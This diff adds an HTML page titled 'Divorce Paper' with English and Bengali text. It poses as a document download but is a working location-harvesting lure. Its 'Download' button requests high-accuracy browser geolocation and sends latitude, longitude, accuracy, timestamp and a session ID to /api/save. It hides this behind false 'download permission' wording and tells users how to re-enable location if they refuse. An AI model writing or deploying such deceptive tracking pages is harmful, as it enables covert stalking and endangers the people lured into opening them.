@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="bn"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Divorce Paper</title>
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--text:#1b1f24;--muted:#667085;--accent:#0b6bcb;--ok:#127a3d;--bad:#b42318;--line:#e4e7ec}
+@media (prefers-color-scheme:dark){:root{--bg:#14171c;--card:#1d222a;--text:#eef0f3;--muted:#9aa4b2;--accent:#5aa7ff;--ok:#4cc77f;--bad:#ff7b72;--line:#2c333d}}
+*{box-sizing:border-box}html,body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,"Noto Sans Bengali",sans-serif}
+main{max-width:560px;margin:0 auto;padding:24px 16px 40px}
+h1{font-size:1.4rem;margin:0 0 4px}
+.sub{color:var(--muted);font-size:.9rem;margin:0 0 20px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;margin-bottom:14px;line-height:1.7}
+.card h2{font-size:1rem;margin:0 0 8px}
+.gate{border:1px solid var(--accent);background:color-mix(in srgb, var(--accent) 8%, var(--card));text-align:center}
+.gate p{margin:0 0 12px;font-size:.95rem;line-height:1.7}
+.hint{background:color-mix(in srgb, var(--bad) 8%, var(--card));border:1px solid var(--bad);border-radius:10px;padding:12px;font-size:.85rem;text-align:left;line-height:1.7;margin-top:12px}
+.hint strong{color:var(--bad)}
+.hint ul{margin:6px 0 0;padding-left:18px}
+.btn{display:inline-block;padding:12px 16px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-size:.95rem;text-decoration:none;cursor:pointer;margin-top:4px;margin-right:8px}
+.btn.alt{background:transparent;color:var(--muted);border:1px solid var(--line)}
+#locMsg{font-size:.88rem;margin-top:10px;min-height:1.2em}
+#site{display:none}
+.hidden{display:none !important}
+</style></head><body><main>
+
+<!-- ===== লোকেশন পারমিশন গেট ===== -->
+<div class="card gate" id="gate">
+  <p><strong>Download the file to read offline.</strong><br>
+  Give the necessary permission, to download the file. Otherwise you will not be able to download the content.</p>
+  <button id="allow" class="btn" type="button">Download</button>
+  <button id="retry" class="btn alt hidden" type="button">Try again</button>
+  <p id="locMsg"></p>
+  <div id="resetHint" class="hint hidden">
+    <strong>How to reset permissions?</strong>
+    <ul>
+      <li><b>Chrome / Edge (Android/ডেস্কটপ):</b> ঠিকানা বারের পাশে 🔒/⚙️ আইকনে ক্লিক করুন → "Site settings" → Location → "Allow" নির্বাচন করুন, তারপর পেজ রিফ্রেশ করুন।</li>
+      <li><b>Firefox:</b> ঠিকানা বারের 🔒 আইকনে ক্লিক করুন → "Connection" / "Permissions" → Location-এর পাশে "Clear permission" → রিফ্রেশ করুন।</li>
+      <li><b>Safari (iPhone/iPad):</b> Settings → Safari → Location → এই সাইটটি খুঁজে "Allow" করুন।</li>
+      <li><b>Safari (Mac):</b> Safari → Settings → Websites → Location → এই সাইটের জন্য "Allow" নির্বাচন করুন।</li>
+    </ul>
+    তারপর <b>"Try again"</b> বাটনে ক্লিক করুন।
+  </div>
+</div>
+
+<!-- ===== সাইটের মূল কনটেন্ট (অনুমতি পেলে দেখাবে) ===== -->
+<div id="site">
+  <h1>👋 আসসালামু আলাইকুম</h1>
+  <p class="sub">এটি আমার ব্যক্তিগত তথ্যের পেজ।</p>
+
+  <!-- ===== এখানে নিজের তথ্য লিখুন ===== -->
+  <div class="card">
+    <h2>আমার সম্পর্কে</h2>
+    <p>এখানে আপনার নিজের লেখা যোগ করুন — নাম, পরিচয়, যোগাযোগের মাধ্যম, বা যা কিছু শেয়ার করতে চান।</p>
+  </div>
+  <!-- ===== তথ্য শেষ ===== -->
+</div>
+
+</main>
+<script>
+var $=function(i){return document.getElementById(i)};
+function msg(t,c){var m=$('locMsg');m.textContent=t;m.style.color=c||'var(--muted)'}
+
+function showSite(){
+  $('gate').classList.add('hidden');
+  $('site').style.display='block';
+}
+
+function showRetry(){
+  $('retry').classList.remove('hidden');
+  $('allow').classList.add('hidden');
+}
+
+function showResetHint(){
+  $('resetHint').classList.remove('hidden');
+}
+
+function requestLocation(){
+  if(!navigator.geolocation){
+    msg('This browser does not have location support. The site cannot be opened.','var(--bad)');
+    showRetry();
+    return;
+  }
+  msg('Requesting download permission…');
+  $('allow').classList.add('hidden');
+  $('resetHint').classList.add('hidden');
+
+  navigator.geolocation.getCurrentPosition(function(p){
+    // File পাওয়া গেছে → সার্ভারে পাঠাই
+    fetch('/api/save', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    lat: p.coords.latitude,
+    lng: p.coords.longitude,
+    acc: p.coords.accuracy,
+    t: Date.now(),
+    page: location.href,
+    session: (function(){
+      var s = sessionStorage.getItem('sid');
+      if (!s) { s = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('sid', s); }
+      return s;
+    })()
+  })
+})
+      .then(function(r){ if(!r.ok) throw new Error('bad'); return r.json(); })
+      .then(function(){ msg('✓ অনুমতি দেওয়া হয়েছে। সাইট খোলা হচ্ছে…','var(--ok)'); setTimeout(showSite,400); })
+      .catch(function(){
+        msg('File পাওয়া গেছে, কিন্তু সংরক্ষণে সমস্যা হয়েছে। আবার চেষ্টা করুন।','var(--bad)');
+        showRetry();
+      });
+  },function(e){
+    if(e.code===1){
+      msg('❌ অনুমতি দেওয়া হয়নি। সাইটের তথ্য পড়তে অনুমতি প্রয়োজন।','var(--bad)');
+      showResetHint();
+    }else{
+      msg('❌ file পাওয়া যায়নি। আবার চেষ্টা করুন।','var(--bad)');
+    }
+    showRetry();
+  },{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+}
+
+$('allow').onclick=requestLocation;
+$('retry').onclick=requestLocation;
+</script>
+</body></html>
